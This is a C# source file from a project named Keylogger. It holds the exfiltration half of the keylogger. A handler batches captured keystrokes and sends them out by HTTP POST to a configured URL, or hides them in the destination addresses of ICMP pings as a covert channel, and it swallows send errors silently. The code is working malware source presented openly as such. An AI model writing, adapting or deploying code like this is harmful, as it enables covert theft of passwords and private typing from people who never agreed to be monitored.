using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger {
	interface IHandler {
		void handle(BlockingCollection<char> queue);
	}

	interface ITarget {
		void send(String phrase);
	}

	class PingTarget: ITarget {
		private IPAddress prefix;
		private Ping pingSender = new Ping();

		public PingTarget(IPAddress prefix) {
			this.prefix = prefix;
		}

		public void send(String phrase) {
			pingSender.Send(toAddress(phrase), 120);
		}

		private IPAddress toAddress(String keys) {
			Byte[] bytes = prefix.GetAddressBytes();

			for (int i = 0; i < keys.Length; i++) {
				bytes[8 + i] = (byte)keys[i];
			}

			return new IPAddress(bytes);
		}
	}

	class HttpTarget: ITarget {
		private String url;
		private HttpClient client = new HttpClient();

		public HttpTarget(String url) {
			this.url = url;
		}

		public void send(String phrase) {
			var values = new Dictionary<string, string>{
				{ "q", phrase },
			};

			var content = new FormUrlEncodedContent(values);
			client.PostAsync(this.url, content).Wait();
		}
	}

	class DelayedHandler : IHandler {
		private int delay_ms;
		private int max_chars;
		private ITarget target;

		public DelayedHandler(ITarget target, int delay_ms = 500, int max_chars = Int32.MaxValue) {
			this.target = target;
			this.delay_ms = delay_ms;
			this.max_chars = max_chars;
		}

		public void handle(BlockingCollection<char> queue) {
			var recv = new StringBuilder();
			var timer = new Stopwatch();

			for (; ; ) {
				recv.Clear();
				recv.Append(queue.Take());
				timer.Reset();

				for (int i = 0; i < max_chars; i++) {
					long remaining = delay_ms - timer.ElapsedMilliseconds;

					char item;
					if (!queue.TryTake(out item, (int) remaining)) {
						break;
					}

					recv.Append(item);
				}

				try {
					target.send(recv.ToString());
				} catch(Exception e) {
					// just fail silently
					Console.WriteLine(e);
				}
			}
		}
	}
}
